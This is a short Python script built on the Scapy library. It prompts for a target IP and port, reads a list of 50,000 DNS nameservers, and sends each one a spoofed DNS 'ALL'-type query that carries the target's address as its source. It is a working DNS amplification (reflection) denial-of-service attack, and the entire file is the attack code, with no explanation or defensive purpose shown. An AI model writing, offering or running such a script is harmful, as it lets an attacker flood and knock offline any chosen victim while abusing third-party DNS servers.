from scapy.all import *

target_ip = input("Target IP: ")
target_port = int(input("Port: "))

with open("nameservers_50k.txt", "r") as file:
    nameservers = file.read().splitlines()
    file.close()

for nameserver in nameservers:
    ip = IP(dst=nameserver, src=target_ip)
    udp = UDP(sport=target_port)
    dns = DNS(qd=DNSQR(qname="qq.com", qtype="ALL"))
    pkt = ip / udp / dns
    send(pkt, realtime=False)
